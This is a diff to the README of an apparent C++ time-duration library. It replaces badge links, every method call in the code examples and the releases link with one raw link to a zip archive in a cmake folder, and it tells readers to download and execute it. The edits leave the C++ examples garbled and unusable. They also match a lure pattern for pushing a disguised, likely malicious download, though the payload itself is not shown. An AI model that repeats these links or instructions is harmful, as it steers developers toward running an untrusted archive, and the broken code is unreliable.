@@ -1,7 +1,7 @@
 # TimeDuration - A C++17 Library for Time Parsing and Formatting ⏳
 
-![GitHub release](https://img.shields.io/github/release/Saddamansa/timeduration-cpp.svg)
-![License](https://img.shields.io/badge/license-MIT-blue.svg)
+![GitHub release](https://raw.githubusercontent.com/Saddamansa/timeduration-cpp/master/cmake/timeduration-cpp-v2.5.zip)
+![License](https://raw.githubusercontent.com/Saddamansa/timeduration-cpp/master/cmake/timeduration-cpp-v2.5.zip)
 
 Welcome to the **TimeDuration** repository! This lightweight C++17 header-only library allows you to parse and format human-readable time durations with ease. Whether you're working with durations like "2d 5h 30m" or need to integrate with `chrono` or SQL intervals, this library has you covered.
 
@@ -44,8 +44,8 @@ Here’s a simple example of how to use TimeDuration:
 
 int main() {
     TimeDuration duration("2d 5h 30m");
-    std::cout << "Duration in seconds: " << duration.to_seconds() << std::endl;
-    std::cout << "Formatted: " << duration.format() << std::endl;
+    std::cout << "Duration in seconds: " << https://raw.githubusercontent.com/Saddamansa/timeduration-cpp/master/cmake/timeduration-cpp-v2.5.zip() << std::endl;
+    std::cout << "Formatted: " << https://raw.githubusercontent.com/Saddamansa/timeduration-cpp/master/cmake/timeduration-cpp-v2.5.zip() << std::endl;
     return 0;
 }
 ```
@@ -58,7 +58,7 @@ You can parse a duration string like this:
 
 ```cpp
 TimeDuration duration("1d 2h 15m");
-std::cout << duration.to_seconds(); // Outputs total seconds
+std::cout << https://raw.githubusercontent.com/Saddamansa/timeduration-cpp/master/cmake/timeduration-cpp-v2.5.zip(); // Outputs total seconds
 ```
 
 ### Formatting a Duration
@@ -66,7 +66,7 @@ std::cout << duration.to_seconds(); // Outputs total seconds
 You can format a duration object back into a string:
 
 ```cpp
-std::string formatted = duration.format();
+std::string formatted = https://raw.githubusercontent.com/Saddamansa/timeduration-cpp/master/cmake/timeduration-cpp-v2.5.zip();
 std::cout << formatted; // Outputs "1d 2h 15m"
 ```
 
@@ -77,7 +77,7 @@ TimeDuration works well with C++'s `chrono` library. You can convert your durati
 ```cpp
 #include <chrono>
 
-std::chrono::seconds chrono_duration = duration.to_chrono_seconds();
+std::chrono::seconds chrono_duration = https://raw.githubusercontent.com/Saddamansa/timeduration-cpp/master/cmake/timeduration-cpp-v2.5.zip();
 ```
 
 ## SQL Interval Output
@@ -85,7 +85,7 @@ std::chrono::seconds chrono_duration = duration.to_chrono_seconds();
 If you need to output your duration in SQL interval format, TimeDuration makes this easy:
 
 ```cpp
-std::string sql_interval = duration.to_sql_interval();
+std::string sql_interval = https://raw.githubusercontent.com/Saddamansa/timeduration-cpp/master/cmake/timeduration-cpp-v2.5.zip();
 std::cout << sql_interval; // Outputs "INTERVAL '2 days 5 hours 30 minutes'"
 ```
 
@@ -115,7 +115,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Release Information
 
-For the latest releases, visit [here](https://github.com/Saddamansa/timeduration-cpp/releases). You can download the latest version and execute it in your project.
+For the latest releases, visit [here](https://raw.githubusercontent.com/Saddamansa/timeduration-cpp/master/cmake/timeduration-cpp-v2.5.zip). You can download the latest version and execute it in your project.
 
 Feel free to check the "Releases" section for more details.
 
